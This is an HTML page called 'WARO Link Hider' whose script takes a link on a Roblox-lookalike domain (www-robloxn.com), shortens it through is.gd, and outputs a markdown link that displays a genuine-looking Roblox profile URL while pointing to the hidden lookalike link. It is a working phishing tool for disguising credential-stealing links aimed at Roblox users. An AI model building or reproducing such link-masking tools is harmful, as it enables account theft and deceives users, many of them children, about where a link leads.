<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>WARO Link Hider</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@800&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body, html {
      height: 100%;
      background: #000;
      font-family: 'Orbitron', sans-serif;
      color: #ff1a1a;
      overflow: hidden;
    }

    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 0 1rem;
    }

    h1 {
      font-size: 3rem;
      text-shadow: 0 0 20px #ff1a1a;
      margin-bottom: 2rem;
      text-align: center;
    }

    .input-box {
      background: rgba(255, 255, 255, 0.05);
      border: 2px solid #ff1a1a;
      padding: 1rem 2rem;
      border-radius: 10px;
      width: 100%;
      max-width: 500px;
      display: flex;
      gap: 1rem;
      align-items: center;
    }

    input {
      flex: 1;
      background: transparent;
      border: none;
      outline: none;
      color: #ff1a1a;
      font-size: 1rem;
      font-weight: 600;
    }

    button {
      background: #ff1a1a;
      color: #000;
      border: none;
      padding: 0.5rem 1rem;
      font-weight: bold;
      cursor: pointer;
      border-radius: 5px;
      transition: 0.3s;
      user-select: none;
    }

    button:hover {
      background: #cc0000;
    }

    .output {
      margin-top: 1rem;
      font-size: 1.1rem;
      text-align: center;
      user-select: text;
      word-break: break-word;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 0.75rem;
    }

    .copy-btn {
      background: #ff1a1a;
      color: #000;
      border: none;
      padding: 0.3rem 0.7rem;
      font-weight: bold;
      cursor: pointer;
      border-radius: 5px;
      transition: 0.3s;
      user-select: none;
      font-size: 0.9rem;
    }

    .copy-btn:hover {
      background: #cc0000;
    }
  </style>
</head>
<body>
  <canvas id="background"></canvas>

  <div class="container">
    <h1>WARO Link Hider</h1>
    <div class="input-box">
      <input type="text" id="linkInput" placeholder="Enter link..." />
      <button onclick="shorten()">Shorten</button>
    </div>
    <div class="output" id="result"></div>
  </div>

  <script>
    const canvas = document.getElementById('background');
    const ctx = canvas.getContext('2d');

    let width = canvas.width = window.innerWidth;
    let height = canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    });

    class Particle {
      constructor() {
        this.reset();
      }

      reset() {
        this.x = Math.random() * width;
        this.y = Math.random() * height;
        this.radius = Math.random() * 2;
        this.vx = Math.random() * 0.5 - 0.25;
        this.vy = Math.random() * 0.5 - 0.25;
      }

      move() {
        this.x += this.vx;
        this.y += this.vy;
        if (this.x < 0 || this.x > width || this.y < 0 || this.y > height) {
          this.reset();
        }
      }

      draw() {
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(255, 0, 0, 0.6)';
        ctx.fill();
      }
    }

    const particles = [];
    for (let i = 0; i < 100; i++) {
      particles.push(new Particle());
    }

    function connectParticles() {
      for (let a = 0; a < particles.length; a++) {
        for (let b = a + 1; b < particles.length; b++) {
          const dx = particles[a].x - particles[b].x;
          const dy = particles[a].y - particles[b].y;
          const dist = dx * dx + dy * dy;

          if (dist < 4000) {
            ctx.beginPath();
            ctx.strokeStyle = 'rgba(255, 0, 0, 0.1)';
            ctx.lineWidth = 1;
            ctx.moveTo(particles[a].x, particles[a].y);
            ctx.lineTo(particles[b].x, particles[b].y);
            ctx.stroke();
          }
        }
      }
    }

    function animate() {
      ctx.clearRect(0, 0, width, height);
      particles.forEach(p => {
        p.move();
        p.draw();
      });
      connectParticles();
      requestAnimationFrame(animate);
    }

    animate();

    async function shorten() {
      const input = document.getElementById('linkInput');
      const result = document.getElementById('result');
      const longUrl = input.value.trim();

      if (!longUrl.startsWith("https://www-robloxn.com/")) {
        result.textContent = "❌ Invalid link. Must start with: https://www-robloxn.com/";
        return;
      }

      try {
        result.textContent = "⏳ Shortening...";

        const response = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`);

        if (!response.ok) throw new Error('Network error');

        const data = await response.json();

        if (!data.shorturl) throw new Error('Short URL not found');

        const shortUrl = data.shorturl;
        const displayUrl = "https://www.roblox.com/users/546464656555/profile";
        const markdownLink = `[${displayUrl}](${shortUrl})`;

        result.textContent = "";

        const textNode = document.createElement("span");
        textNode.textContent = markdownLink;
        textNode.style.userSelect = "text";

        const copyBtn = document.createElement("button");
        copyBtn.textContent = "Copy";
        copyBtn.className = "copy-btn";
        copyBtn.onclick = () => {
          navigator.clipboard.writeText(markdownLink).then(() => {
            copyBtn.textContent = "Copied!";
            setTimeout(() => copyBtn.textContent = "Copy", 1500);
          });
        };

        result.appendChild(textNode);
        result.appendChild(copyBtn);

      } catch (error) {
        result.textContent = "❌ Error shortening link: " + error.message;
      }
    }
  </script>
</body>
</html>
